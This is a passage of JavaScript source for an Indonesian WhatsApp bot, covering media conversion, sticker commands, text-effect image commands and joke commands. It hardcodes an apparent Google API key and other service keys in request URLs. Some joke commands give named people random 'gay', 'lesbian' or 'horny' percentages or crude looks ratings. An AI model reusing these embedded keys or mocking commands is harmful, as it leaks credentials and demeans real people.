           let { webp2mp4File } = require('./lib/uploader')
           let media = await tganz.downloadAndSaveMediaMessage(quoted)
           let webpToMp4 = await webp2mp4File(media)
           await tganz.sendMessage(from, { video: { url: webpToMp4.result, caption: mess.done } }, { quoted:m })
           await fs.unlinkSync(media)
           }
           break
           case 'toaud': case 'toaudio': case 'tomp3': {
               if (isBan) return reply(mess.ban)
           if (!isMedia) return reply(`*Kɪʀɪᴍ/Bᴀʟᴀs ᴠɪᴅᴇᴏ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ :* ${prefix + command}`)
           if (!/video/.test(mime)) return reply(`*Kɪʀɪᴍ/Rᴇᴘʟʏ ᴠɪᴅᴇᴏ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ :* ${prefix + command}`)
           reply(mess.wait)
           let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
tganz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `${tanggal}.mp3`}, { quoted : m })
}
break
         case 'tovn': case 'tovoice': case 'toptt': {
               if (isBan) return reply(mess.ban)
           if (!isMedia) return reply(`*Kɪʀɪᴍ/Bᴀʟᴀs ᴠɪᴅᴇᴏ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ :* ${prefix + command}`)
           if (!/video/.test(mime)) return reply(`*Kɪʀɪᴍ/Rᴇᴘʟʏ ᴠɪᴅᴇᴏ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ :* ${prefix + command}`)
           reply(mess.wait)
           let media = await quoted.download()
           let { toPTT } = require('./lib/converter')
           let audio = await toPTT(media, 'mp4')
           tganz.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
           }
           break
         case 'togif': {
               if (isBan) return reply(mess.ban)
           if (!isMedia) return reply('Rᴇᴘʟʏ sᴛɪᴄᴋᴇʀ Gɪғɴʏᴀ !')
           if (!/webp/.test(mime)) return reply(`*Kɪʀɪᴍ/Bᴀʟᴀs sᴛɪᴄᴋᴇʀ Gɪғ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ :* ${prefix + command}`)
           reply(mess.wait)
           let { webp2mp4File } = require('./lib/uploader')
           let media = await tganz.downloadAndSaveMediaMessage(quoted)
           let webpToMp4 = await webp2mp4File(media)
           await tganz.sendMessage(from, { video: { url: webpToMp4.result, caption: mess.done }, gifPlayback: true }, { quoted:m })
           await fs.unlinkSync(media)
           }
           break
           case 'emojimix': {
               if (isBan) return reply(mess.ban)
        let [emoji1, emoji2] = text.split`+`
      if (!emoji1) return reply(`Cᴏɴᴛᴏʜ : ${prefix + command} 😀+😅`)
      if (!emoji2) return reply(`Cᴏɴᴛᴏʜ : ${prefix + command} 😘+😁`)
      let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
      for (let res of anu.results) {
      let encmedia = await tganz.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
      await fs.unlinkSync(encmedia)
         }
     }
       break
           case 'emojimix2': {
               if (isBan) return reply(mess.ban)
       if (!text) return reply(`Cᴏɴᴛᴏʜ : ${prefix + command} 😘`)
       let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
       for (let res of anu.results) {
       let encmedia = await tganz.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
      await fs.unlinkSync(encmedia)
        }
       }
         break
           case 'stikermeme': 
           case 'smeme': 
           case 'stickermeme': {
           if (isBan) return reply(mess.ban)
	        let respond = `Kɪʀɪᴍ/Bᴀʟᴀs Gᴀᴍʙᴀʀ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ : ${prefix + command} Tᴇᴋs-1|Tᴇᴋs-2\n\n*❑ Cᴏɴᴛᴏʜ : ${prefix + command} Tᴇsᴛ|Gᴀɴᴢ*`
	     try {
	        if (!/image/.test(mime)) return m.reply(respond)
            if (!text) return m.reply(respond)
	           m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
          let dwnld = await tganz.downloadAndSaveMediaMessage(qmsg)
	        let fatGans = await TelegraPh(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
	        let awikwok = await tganz.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
	        await fs.unlinkSync(awikwok)
            } catch (e) {
		    m.reply(`*Mᴀᴀғ ᴋᴀᴋᴀᴋ, Pᴇᴍʙᴜᴀᴛᴀɴ sᴍᴇᴍᴇ ʜᴀɴʏᴀ ʙᴇʀʟᴀᴋᴜ ᴘᴀᴅᴀ ɢᴀᴍʙᴀʀ, Sɪʟᴀʜᴋᴀɴ ᴋɪʀɪᴍ ɢᴀᴍʙᴀʀ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ : ${prefix + command} Kᴀᴍᴜ|Cᴀᴋᴇᴘ :3*`)
		         }
      }
	       break          
	       case 'gcase':
	       case 'getcase':
	       case 'gtcase': {
	if (isBan) return reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return m.reply (`Mᴀᴜ ʟɪʜᴀᴛ Cᴀsᴇ ᴀᴘᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} sᴛɪᴄᴋᴇʀ*`) 
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("@TGanzBOT.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
m.reply (`${getCase(q)}`)
}
break
	          case 'qrcode':
	          case 'qr':
	          case 'cqr':
	          case 'createqr': {
           if (isBan) return reply(mess.ban)
	          if (!text) return reply(`Tᴇᴋsɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Tᴇsᴛ Gᴀɴᴛᴇɴɢ Bᴀɴɢᴇᴛ UᴡU*`)
tganz.sendFile(m.chat, await toDataURL(text.slice(0, 2048), { scale: 8 }), 'qrcode.jpg', mess.done, m)
           }
               break
           case 'toimage': case 'toimg': {
               if (isBan) return reply(mess.ban)
           if (!m.quoted) return reply('Rᴇᴘʟʏ Gᴀᴍʙᴀʀɴʏᴀ !')
           if (!/webp/.test(mime)) return reply(`Bᴀʟᴀs sᴛɪᴋᴇʀɴʏᴀ ᴅᴇɴɢᴀɴ ᴋᴇᴛɪᴋ : *${prefix + command}*`)
           reply(mess.wait)
           let media = await tganz.downloadAndSaveMediaMessage(quoted)
           let ran = await getRandom('.png')
           exec(`ffmpeg -i ${media} ${ran}`, (err) => {
           fs.unlinkSync(media)
           if (err) throw err
           let buffer = fs.readFileSync(ran)
           tganz.sendMessage(from, { image: buffer, caption: mess.done }, { quoted:m })
           fs.unlinkSync(ran)
           })
        }
         break
            case 'sticker':
            case 'stiker':
            case 's':
            case 'stickergif':
            case 'sgif': {
            if (isBan) return reply(mess.ban)
       if (!quoted) return `Hᴀɪ ᴋᴀᴋ, Bᴀʟᴀs Gᴀᴍʙᴀʀ/Vɪᴅᴇᴏɴʏᴀ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴋᴇʀ !\n\n*❑ Jɪᴋᴀ ᴠɪᴅᴇᴏ ᴜᴛᴀᴍᴀᴋᴀɴ ᴛɪᴅᴀᴋ ᴍᴇʟᴇʙɪʜɪ 10 ᴅᴇᴛɪᴋ !!!*`
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await tganz.sendImageAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return m.reply('*Mᴀᴋsɪᴍᴀʟ 10 Dᴇᴛɪᴋ*')
                    let media = await quoted.download()
                    let encmedia = await tganz.sendVideoAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                   m.reply(`Hᴀɪ ᴋᴀᴋ, Bᴀʟᴀs Gᴀᴍʙᴀʀ/Vɪᴅᴇᴏɴʏᴀ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴋᴇʀ !\n\n*❑ Jɪᴋᴀ ᴠɪᴅᴇᴏ ᴜᴛᴀᴍᴀᴋᴀɴ ᴛɪᴅᴀᴋ ᴍᴇʟᴇʙɪʜɪ 10 ᴅᴇᴛɪᴋ !!!*`)
                }
            }
            break
            case "dino-kuning":
            case'dinokuning': {
               if (isBan) return reply(mess.ban)
var stiks = `http://api.lannn.me/api/sticker/dinokuning?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "patrik":
            case "petrik":
            case "patrick": {
               if (isBan) return reply(mess.ban)
            var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await tganz.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
    case 'gantengcek':
				case 'cekganteng': {
				if (isBan) return reply(mess.ban)
					if(!text) return reply(`*◈ Cᴀʀᴀ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Pᴜᴛʀᴀ ?*`)
	       				let apa = ['5% : abang ini jelek amat anjir dhlh mending cari yang lain 🗿','10% : bang lu ganteng cuma anehnya mirip kek kenalpot motor gw yang item ya 🗿','30% : lumayan sih cuma kok ada jerawatnya ya di wajah kurang goodloking lah 🗿','20% : anjir mukanya ganteng tapi item gw yang lagi makan sampe keselek 🗿','40% : wih lumayan ganteng nih cuma ada yang kurang kok pantatnya item ya 🗿','50% : wah ini pasti yang di cari cari sama orang lain lumayan ganteng sih mirip kang sule 🗿','60% : abang ini ganteng juga lumayan lah untuk pacar yang minimal 20 mantan mangat bang 🗿','70% : wah ini pasti calon mantu yang banyak di cari sama orang lain hanya saja sulit di dapatkan 🗿','62% : lumayan juga nih abang nambah goodloking dikit cuma kok ada yang kurang ya pacarnya kenapa 1 doank bang 🗿','74% : anjay seleb nih pasti susah dapetinya cuma ada yang kurang pasti dompetnya suka kosong tapi ganteng sih 🗿','83% : uhhh ganteng juga nih cowo gila sih mantap lah hanya saja bukan milik yang rendahan 🗿','97% : uhh selebritas nih ketahuan sih gantengnya melebihi daratan dan seleb lainnya pasti lebih susah di dapatkan nih abangnya 🗿','100% : dhlh ini jangan di tanya pasti kaya dan ganteng seperti bts serta artis terganteng di dunia luar negeri meengingatkan saja sih jangan terlalu rendahin aja ya bang kami bangsa rendahan jadi jangan di rendahin 🗿🙏🏻','29% : sulit berkata gw sih cuma bilang mukanya ganteng pacarnya ga ada uangnya juga kosong 🗿','94% : uhh ganteng juga nih abang pasti mantanya banyak dan uangnya juga ga main dhlh kami yang biasa diem aja 🗿','75% : anjay lumayan juga nih abang nih ganteng juga cuma anehnya ada yang kurang yaitu bukan yang pasti karena abang ini bukan main di hadapan cewe lain 🗿','82% : wah ganteng juga pasti putihnya pake makeup ya bang intinya ganteng bang mantap lah cewenya juga pasti banyak nih keknya dhlh 🗿','41% : wes lumayan abang ini telah mencetak keganteng limit saking limitnya ga punya mantan dan pacar + harus lebih di tingkatkan lagi 🗿','39% : anjay abang nih sudah mulai meningkat cuma kurang pepsodent giginya ada arengnya ga mungkin kan ganteng gigi item 🗿']
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*❑ Pᴇʀᴛᴀɴʏᴀᴀɴ :* Cᴇᴋ Kᴇɢᴀɴᴛᴇɴɢᴀɴ ⟨ *${text}* ⟩\n*❑ Jᴀᴡᴀʙ :* ${kah}`
                tganz.sendMessage(m.chat, { text: jawab }, {quoted: m})
            } 
            break
            case 'halah':
            case 'hilih':
            case 'huluh':
            case 'heleh':
            case 'holoh': {
            if (isBan) return reply(mess.ban)
                if (!m.quoted && !text) return reply(`*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command}* ⟨ Bᴀʟᴀs Pᴇsᴀɴɴʏᴀ ⟩`)
                ter = command[1].toLowerCase()
                tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            }
             break
				case 'cantikcek':
				case 'cekcantik': {
				if (isBan) return reply(mess.ban)
				if(!text) return reply(`*◈ Cᴀʀᴀ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Nᴀɴᴅᴀ ?*`)
	       				let apa = ['10% : murahan ya kak haha tingkatin dong pake odol 🗿','30% : lumayan lah kakak gini mah untuk isi dompet yang pas pasan 🗿','20% : kakak ini cantik juga cuma kalo lagi malesnya males banget liat mukanya kek pen berak 🗿','40% : wah lumayan juga glowing dikit cuma bukan milik yang pas pasan uangnya cuma kok ada yang kurang ya itu celananya pendek amat anjr 🗿','50% : wah normal nih cantik kaga jelek kaga normal lah ga tau normal kek mana 🗿','60% : lumayan lah kalo kakak ini mah cuma ada yang kurang uangnya ada ga nih kak nanti di pasangin cowo ganteng ga ada uangnya lagi 🗿','70% : wah cantik juga kok bisa nambah sih kak pasti di bantu uang ortu yahaha kerja dong kak hasil sendiri 🗿','62% : sudah ku duga pasti mukanya lumayan cantik cuma giginya kuning belum gosok gigi nih selama 2 harian dhlh 🗿','74% : wah nambah mood nih kalo pacaran sama kakak ini karena cantiknya dari kaca spion motor doank aslinya mah beda 🗿','83% : anjay lumayan juga nih buat di senggol cuma kok aneh ya muka cantik uang ga ada plus ngapa banyak jodohnya dah jadi tidak kebagian tiket pacarnya 🗿','97% : wah ini mantan selebritas yang suka di artis artis medsos cuma mantan ya ga tau realitanya pasti mantan sebelumnya banyak juga tapi kawai lah 🗿','100% : wah ini tidak di abai abaikan karena cantiknya kebangetan pasti mamah papahnya bangga punya kakak ini dan pacarnya banyaj yang menunggu kesetujuanya dhlh jangan di arep bagi yang rendahan 🗿🙏🏻','29% : wajah nya sih baagus cuma sendalnya kok swalau ya ga ada sendal lain kah 🗿','94% : wih anjay boss kakak ini juga lumayan sih bodynya pasti bagus cuma bukan milik rendahan yang dompetnya pas pasan 🗿','75% : lumayan lah untuk jadi gebetan para cowo yang mauan pasti kakak ini wajahnya putih dan sopan tau sopanya asli apa kaga jangan cuma di wa aja ya kak 🗿','82% : wess mantap nih kakak pasti suka konsumsi susu beruang dan domba mukanya putih bangetbodynya juga lumayan lah cuma kok bokongnya agak hitam ya kak maaf ya kak cuma cakep kok 🗿🙏🏻','41% : dhlh kalo kakak kayak gini cantiknya sih iya cuma kalo dh di deketin baunya kok suka ada ya apa cuma pikiran cowo aja ya 🗿','39% : kakak ini pasti suka fans bts atau cogan lura negeri cuma mengingatkan kembali ingat postur tubuh dan wajah ya kak jangan asal kenalan nanti bukannya mau malah malu 🗿🙏🏻']
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*❑ Pᴇʀᴛᴀɴʏᴀᴀɴ :* Cᴇᴋ Kᴇᴄᴀɴᴛɪᴋᴀɴ ⟨ *${text}* ⟩\n*❑ Jᴀᴡᴀʙ :* ${kah}`
                tganz.sendMessage(m.chat, { text: jawab }, {quoted: m})
            } 
            break
            case 'bagaimana':
            case 'bagaimanakah': {
            if (isBan) return reply(mess.ban)
                if (!q) return m.reply(`*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Aᴋᴜ ʙɪsᴀ ʟᴜʟᴜs*`)
                const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Gimana yeee']
                const ya = gimana[Math.floor(Math.random() * gimana.length)]
                tganz.sendMessage(m.chat, {
                    text: `*❑ Pᴇʀᴛᴀɴʏᴀᴀɴ :* ${q}*\n*❑ Jᴀᴡᴀʙ :* ${ya}`
                }, {
                    quoted: m
                })
                } 
                break
            case 'sangecek':
            case 'ceksange': {
            if (isBan) return reply(mess.ban)
                if (!q) return m.reply(`*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :* ${prefix + command} ${pushname}`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                tganz.sendMessage(m.chat, {
                    text: `*❑ Nᴀᴍᴀ :* ${q}\n*❑ Jᴀᴡᴀʙ :* *${sange}%* Sᴀɴɢᴇᴀɴ 🗿`
                }, {
                    quoted: m
                })
                }
                break
            case 'lesbicek':
            case 'ceklesbi': {
            if (isBan) return reply(mess.ban)
                if (!q) return m.reply(`*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :* ${prefix + command} ${pushname}`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                tganz.sendMessage(m.chat, {
                    text: `*❑ Nᴀᴍᴀ :* ${q}\n*❑ Jᴀᴡᴀʙ :* *${sange}%* Sᴜᴋᴀ Lᴇsʙɪᴀɴ 🗿`
                }, {
                    quoted: m
                })
                }
                break
            case 'gaycek':
            case 'cekgay': {
            if (isBan) return reply(mess.ban)
                if (!q) return m.reply(`*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :* ${prefix + command} ${pushname}`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                tganz.sendMessage(m.chat, {
                    text: `*❑ Nᴀᴍᴀ :* ${q}\n*❑ Jᴀᴡᴀʙ :* *${sange}%* Sᴜᴋᴀ Gᴀʏ 🗿`
                }, {
                    quoted: m
                })
                } 
                break
                case 'wangi':
                case 'wangy': {
                if (isBan) return reply(mess.ban)
                if (!q) return m.reply(`*◈ Cᴀʀᴀ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Nᴀɴᴅᴀ ?*`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                m.reply(awikwok)
                } 
                break
            case "spongsbob": 
            case "spongebob": 
            case "sponsbob": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/spongebob?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "kawan-sponsbob": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/kawanspongebob?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "sponsbob": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/spongebob?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "doge": {
               if (isBan) return reply(mess.ban)
            var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await tganz.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
break
            case "manusia-lidi": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/manusialidi?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
           case "chat": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/chat?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "amongus": {
               if (isBan) return reply(mess.ban)
            var stiks = `https://api.lolhuman.xyz/api/sticker/amongus?apikey=kocheng`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "anime": {
            if (isBan) return reply(mess.ban)
            var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await tganz.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
            case "animegif": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/animegif?apikey=Lann`
  tganz.sendVideoAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "sbucin": {
               if (isBan) return reply(mess.ban)
            var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await tganz.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
break
            case "rabbit": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/rabbit?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "dadu": {
               if (isBan) return reply(mess.ban)
            var stiks = `https://api.lolhuman.xyz/api/sticker/dadu?apikey=kocheng`
  tganz.sendVideoAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "pentol": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/pentol?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "gura": {
               if (isBan) return reply(mess.ban)
            var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await tganz.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
break
            case "mukalu": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/mukalu?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "patrickgif": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/patrickgif?apikey=Lann`
  tganz.sendVideoAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "paimon": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/paimon?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            case "random": {
               if (isBan) return reply(mess.ban)
            var stiks = `http://api.lannn.me/api/sticker/random?apikey=Lann`
  tganz.sendImageAsSticker(m.chat, stiks, m, { packname: global.packname, author: global.author })
   }
  break
            //telegram sticker
            case "awoawo":
            case "benedict":
            case "dbfly":
            case "hope-boy":
            case "jisoo":
            case "kr-robot":
            case "lonte":
            case "menjamet":
            case "meow":
            case "nicholas":
            case "tyni": {
               if (isBan) return reply(mess.ban)
                reply(mess.wait)
                let res = await fetch(global.api('alfa', '/api/telegram-sticker/' + command, {}, 'apikey'))
                if (!res.ok) throw await res.text()
                let img = await res.buffer()
                let savestik = await tganz.sendImageAsSticker(m.chat, img, m, {
                    packname: packname,
                    author: author
                })
                await fs.unlinkSync(savestik)
            }
            break
            case 'tulis':
            case 'menulis':
            case 'nulis': {
               if (isBan) return reply(mess.ban)
                if (!q) return reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} TᴇsᴛGᴀɴᴢ Gᴀɴᴛᴇɴɢ`)
                reply(mess.wait)
                var mfarelsapi = `http://mfarels.my.id/api/magernulis10?text=${encodeURIComponent(q)}`
                tganz.sendMessage(m.chat, { image: { url: mfarelsapi }, caption: `*😾 Jᴀɴɢᴀɴ ᴍᴀʟᴀs ᴅᴏɴɢ ᴋᴀᴋ 😾*` })
            }
             break
            //textpro
            case "3dbox":
            case "3dchrome":
            case "3dglue":
            case "3stone":
            case "abstra":
            case "advanced":
            case "bear":
            case "berry":
            case "biscuit":
            case "black-metal":
            case "blood":
            case "blood2":
            case "blue-balloon":
            case "blue-gem":
            case "blue-glass":
            case "blue-glitter":
            case "blue-jewelry":
            case "blue-metal":
            case "blue-sparkling":
            case "bokeh":
            case "bread":
            case "broken":
            case "bronze-glitter":
            case "candy":
            case "captain-as2":
            case "carbon":
            case "chocolate":
            case "chrismast":
            case "christmas":
            case "cloudsky":
            case "cyan-balloon":
            case "cyan-glass":
            case "cyan-jewelry":
            case "cyan-sparkling":
            case "dark-gold":
            case "decorate":
            case "decorate-purple":
            case "decorative":
            case "deluxe-gold":
            case "demon":
            case "denim":
            case "discovery":
            case "dropwater":
            case "drug":
            case "embossed":
            case "engraved":
            case "equalizer":
            case "eroded-metal":
            case "fabric":
            case "fiction":
            case "firework":
            case "glitch":
            case "gloss":
            case "glossy":
            case "glossy-blue":
            case "glossy-carbon":
            case "gold-balloon":
            case "gold-glitter":
            case "gold-sparkling":
            case "golden":
            case "gradient":
            case "gradient2":
            case "green-balloon":
            case "green-glass":
            case "green-glitter":
            case "green-jewelry":
            case "green-neon":
            case "green-sparkling":
            case "halloween":
            case "halloween2":
            case "holographic":
            case "honey2":
            case "hot-metal":
            case "ice":
            case "joker":
            case "juice":
            case "koifish":
            case "luxury2":
            case "magma":
            case "marble":
            case "marble2":
            case "matrix":
            case "metal-silver":
            case "metaldark":
            case "metallic2":
            case "minion":
            case "multicolor":
            case "natural":
            case "neon":
            case "neon-devil":
            case "neon-light":
            case "neon2":
            case "neonc":
            case "neonlight":
            case "neonligth2":
            case "newyear":
            case "newyear2":
            case "orange-glass":
            case "orange-jewelry":
            case "oscar":
            case "papercut":
            case "peridot":
            case "pink-balloon":
            case "pink-glitter":
            case "pink-sparkling":
            case "purple":
            case "purple-balloon":
            case "purple-gem":
            case "purple-glass":
            case "purple-glitter":
            case "purple-jewelry":
            case "purple-shiny-glass":
            case "purple-sparkling":
            case "rainbow2":
            case "red-balloon":
            case "red-glass":
            case "red-jewelry":
            case "red-sparkling":
            case "road-warning":
            case "teknologi":
            case "rock":
            case "rusty":
            case "scifi":
            case "shiny":
            case "silver-glitter":
            case "silver-jewelry":
            case "sircuit":
            case "skeleton":
            case "sketch":
            case "snow":
            case "steel":
            case "strawberry":
            case "summer":
            case "summery":
            case "thunder":
            case "thunder2":
            case "toxic":
            case "transformer":
            case "underwater":
            case "wall":
            case "water-pipe":
            case "watercolor":
            case "wicker":
            case "wonderful-graffiti":
            case "wood":
            case "writing":
            case "xmas":
            case "yellow-glass":
            case "yellow-jewelry": {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ`)
                reply(mess.wait)
                let res = await fetch(global.api('alfa', '/api/textpro/' + command, {
                    text: text
                }, 'apikey'))
                if (res.status != 200) throw await res.text()
                let img = await res.buffer()
                tganz.sendFile(m.chat, img, 'textpro.jpg', mess.done, m)
            }
            break
            //grup
            case 'mute': {
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
